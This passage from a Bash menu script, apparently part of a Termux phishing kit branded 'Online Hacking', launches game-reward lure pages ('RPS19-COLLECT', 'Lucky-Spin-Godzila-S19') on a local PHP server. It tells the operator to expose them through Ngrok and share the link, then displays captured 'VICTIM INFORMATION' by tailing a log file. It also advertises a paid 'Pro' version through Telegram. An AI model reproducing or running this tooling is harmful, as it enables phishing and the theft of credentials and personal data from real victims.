                           read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Click ENTER to Continue \e[1;91m (enter) : \e[0m' option
                           echo""
                           echo""
                           echo ""
			   echo ""
                           echo -e $" [\e[92m*\e[91m]\e[1;93m Online Hacking Server Connect... \e[0m  "
			   sleep 2
			   echo ""
			   echo -e $" [\e[92m*\e[91m]\e[1;93m Server Status Chacking ... \e[0m  "
			   sleep 2
			   echo ""
			   echo -e $" [\e[1;92m*\e[1;91m]\e[1;93m Scan Live User Traffic Security ... \e[0m   "
			   sleep 2
			   echo ""
			   echo -e $" [\e[92m*\e[91m]\e[1;93m PHP Server Now Startng ... \e[0m  "
                           echo ""
			   php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                           sleep 3
			   echo ""
                           echo ""
                           echo ""
echo -e "\e[92m
SUMAN ©\e[34m
         ██████╗ ███╗   ██╗██╗     ██╗███╗   ██╗███████╗    
        ██╔═══██╗████╗  ██║██║     ██║████╗  ██║██╔════╝    
        ██║   ██║██╔██╗ ██║██║     ██║██╔██╗ ██║█████╗      
        ██║   ██║██║╚██╗██║██║     ██║██║╚██╗██║██╔══╝      
        ╚██████╔╝██║ ╚████║███████╗██║██║ ╚████║███████╗    
         ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═╝╚═╝  ╚═══╝╚══════╝    
                                                            
    ██╗  ██╗ █████╗  ██████╗██╗  ██╗██╗███╗   ██╗ ██████╗   
    ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██║████╗  ██║██╔════╝   
    ███████║███████║██║     █████╔╝ ██║██╔██╗ ██║██║  ███╗  
    ██╔══██║██╔══██║██║     ██╔═██╗ ██║██║╚██╗██║██║   ██║  
    ██║  ██║██║  ██║╚██████╗██║  ██╗██║██║ ╚████║╚██████╔╝  
    ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝   
ONLINE HACKING			  
							  							  
          \e[m"
echo -e " \e[36mWebsite : \e[0m\e[92mwww.onlinehacking.xyz \e[0m\n"
  
echo -e " \e[31mGitHub : \e[0m\e[93mhttps://github.com/OnlineHacKing \e[0m\n"

echo -e " \e[97mTelegram : \e[0m\e[34mhttps://telegram.dog/OnlineHacKing \e[0m\n"
		           echo ""
                           echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
			   echo ""
			   echo -e "\e[96m========================\e[92m    SUMAN © 2021    \e[96m=========================\e[92m"
                           echo ""
                           echo ""
			   echo ""
                           echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m \e[0m\e[1;36m Share Ngrok Link and Using "
			   echo ""
                           
                           if [[ -e OnlineHacking.txt ]]; then
                           > OnlineHacking.txt
                           fi 
                           echo ""
                           echo ""
                           tail -f OnlineHacking.txt

                  break;   
		  
elif [ $option = 09 ] || [ $option = 9 ]
	          then
	                   cd /data/data/com.termux/files/usr/bin/SUMAN1/
                           cd RPS19-COLLECT/         
                           echo ""
			   echo ""
                           printf "\e[31m[\e[32m★\e[31m]\e[32m Manually Start Ngrok \e[m "
                           echo ""
			   echo ""
			   echo -e "\e[91m[\e[92m*\e[91m]\e[1;93m Open New Session (tab) Type This Command :\e[0m\e[1;36m Run-Ngrok  "
                           echo ""
			   echo ""
			   echo ""
                           read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Click ENTER to Continue \e[1;91m (enter) : \e[0m' option
                           echo""
                           echo""
                           echo ""
			   echo ""
                           echo -e $" [\e[92m*\e[91m]\e[1;93m Online Hacking Server Connect... \e[0m  "
			   sleep 2
			   echo ""
			   echo -e $" [\e[92m*\e[91m]\e[1;93m Server Status Chacking ... \e[0m  "
			   sleep 2
			   echo ""
			   echo -e $" [\e[1;92m*\e[1;91m]\e[1;93m Scan Live User Traffic Security ... \e[0m   "
			   sleep 2
			   echo ""
			   echo -e $" [\e[92m*\e[91m]\e[1;93m PHP Server Now Startng ... \e[0m  "
                           echo ""
			   php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                           sleep 3
			   echo ""
                           echo ""
                           echo ""
echo -e "\e[92m
SUMAN ©\e[34m
         ██████╗ ███╗   ██╗██╗     ██╗███╗   ██╗███████╗    
        ██╔═══██╗████╗  ██║██║     ██║████╗  ██║██╔════╝    
        ██║   ██║██╔██╗ ██║██║     ██║██╔██╗ ██║█████╗      
        ██║   ██║██║╚██╗██║██║     ██║██║╚██╗██║██╔══╝      
        ╚██████╔╝██║ ╚████║███████╗██║██║ ╚████║███████╗    
         ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═╝╚═╝  ╚═══╝╚══════╝    
                                                            
    ██╗  ██╗ █████╗  ██████╗██╗  ██╗██╗███╗   ██╗ ██████╗   
    ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██║████╗  ██║██╔════╝   
    ███████║███████║██║     █████╔╝ ██║██╔██╗ ██║██║  ███╗  
    ██╔══██║██╔══██║██║     ██╔═██╗ ██║██║╚██╗██║██║   ██║  
    ██║  ██║██║  ██║╚██████╗██║  ██╗██║██║ ╚████║╚██████╔╝  
    ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝   
ONLINE HACKING			  
							  							  
          \e[m"
echo -e " \e[36mWebsite : \e[0m\e[92mwww.onlinehacking.xyz \e[0m\n"
  
echo -e " \e[31mGitHub : \e[0m\e[93mhttps://github.com/OnlineHacKing \e[0m\n"

echo -e " \e[97mTelegram : \e[0m\e[34mhttps://telegram.dog/OnlineHacKing \e[0m\n"
		           echo ""
                           echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
			   echo ""
			   echo -e "\e[96m========================\e[92m    SUMAN © 2021    \e[96m=========================\e[92m"
                           echo ""
                           echo ""
			   echo ""
                           echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m \e[0m\e[1;36m Share Ngrok Link and Using "
			   echo ""
                           
                           if [[ -e OnlineHacking.txt ]]; then
                           > OnlineHacking.txt
                           fi 
                           echo ""
                           echo ""
                           tail -f OnlineHacking.txt


                  break;		  
elif [ $option = 10 ] || [ $option = 010 ]
	          then
	                   cd /data/data/com.termux/files/usr/bin/SUMAN/
                           cd Lucky-Spin-Godzila-S19/     
                           echo ""
			   echo ""
                           printf "\e[31m[\e[32m★\e[31m]\e[32m Manually Start Ngrok \e[m "
                           echo ""
			   echo ""
			   echo -e "\e[91m[\e[92m*\e[91m]\e[1;93m Open New Session (tab) Type This Command :\e[0m\e[1;36m Run-Ngrok  "
                           echo ""
			   echo ""
			   echo ""
                           read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Click ENTER to Continue \e[1;91m (enter) : \e[0m' option
                           echo""
                           echo""
                           echo ""
			   echo ""
                           echo -e $" [\e[92m*\e[91m]\e[1;93m Online Hacking Server Connect... \e[0m  "
			   sleep 2
			   echo ""
			   echo -e $" [\e[92m*\e[91m]\e[1;93m Server Status Chacking ... \e[0m  "
			   sleep 2
			   echo ""
			   echo -e $" [\e[1;92m*\e[1;91m]\e[1;93m Scan Live User Traffic Security ... \e[0m   "
			   sleep 2
			   echo ""
			   echo -e $" [\e[92m*\e[91m]\e[1;93m PHP Server Now Startng ... \e[0m  "
                           echo ""
			   php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                           sleep 3
			   echo ""
                           echo ""
                           echo ""
echo -e "\e[92m
SUMAN ©\e[34m
         ██████╗ ███╗   ██╗██╗     ██╗███╗   ██╗███████╗    
        ██╔═══██╗████╗  ██║██║     ██║████╗  ██║██╔════╝    
        ██║   ██║██╔██╗ ██║██║     ██║██╔██╗ ██║█████╗      
        ██║   ██║██║╚██╗██║██║     ██║██║╚██╗██║██╔══╝      
        ╚██████╔╝██║ ╚████║███████╗██║██║ ╚████║███████╗    
         ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═╝╚═╝  ╚═══╝╚══════╝    
                                                            
    ██╗  ██╗ █████╗  ██████╗██╗  ██╗██╗███╗   ██╗ ██████╗   
    ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██║████╗  ██║██╔════╝   
    ███████║███████║██║     █████╔╝ ██║██╔██╗ ██║██║  ███╗  
    ██╔══██║██╔══██║██║     ██╔═██╗ ██║██║╚██╗██║██║   ██║  
    ██║  ██║██║  ██║╚██████╗██║  ██╗██║██║ ╚████║╚██████╔╝  
    ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝   
ONLINE HACKING			  
							  							  
          \e[m"
echo -e " \e[36mWebsite : \e[0m\e[92mwww.onlinehacking.xyz \e[0m\n"
  
echo -e " \e[31mGitHub : \e[0m\e[93mhttps://github.com/OnlineHacKing \e[0m\n"

echo -e " \e[97mTelegram : \e[0m\e[34mhttps://telegram.dog/OnlineHacKing \e[0m\n"
		           echo ""
                           echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
			   echo ""
			   echo -e "\e[96m========================\e[92m    SUMAN © 2021    \e[96m=========================\e[92m"
                           echo ""
                           echo ""
			   echo ""
                           echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m \e[0m\e[1;36m Share Ngrok Link and Using "
			   echo ""
                           
                           if [[ -e OnlineHacking.txt ]]; then
                           > OnlineHacking.txt
                           fi 
                           echo ""
                           echo ""
                           tail -f OnlineHacking.txt

                  break;		  
elif [ $option = 50 ] || [ $option = 050 ]
	          then
	                   cd SUMAN/ 
                           echo ""
                           echo -e $" [\e[92m*\e[91m]\e[1;95m How To Unlock Pro Version for Free \e[0m  "
			   sleep 4
			   echo ""
			   echo ""
			   echo -e $" [\e[92m*\e[91m]\e[1;92m  1. Join Telegram Channel and Group Message @admin :\e[0m  "
			   echo -e $"     \e[1;32m https://telegram.dog/OnlineHacking \e[0m  "
			   sleep 2
			   echo ""
			   echo -e $" [\e[1;92m*\e[1;91m]\e[1;93m  2. Unlock Pro Reed This Post : \e[0m   "
			   echo -e $"     \e[1;32m https://telegram.dog/s/OnlineHacking/ \e[0m   "
			   sleep 2
			   echo ""
			   echo -e $" [\e[92m*\e[91m]\e[1;93m 3. Mail Send :\e[1;36m info@onlinehacking.xyz \e[0m  "
                           echo ""
                           sleep 50
			   echo ""
			   
			   

                  break;		  

                elif [ $option = 99 ]
	        then     
	                 echo
       	                 exit 
		break;
		      
                else 
		  
		         echo
		         echo -e "\e[92m[\e[94m!\e[92m]\e[92m Invalid option Try Again !! \e[m "
		         sleep 2
                         exit
		         fi
                         done
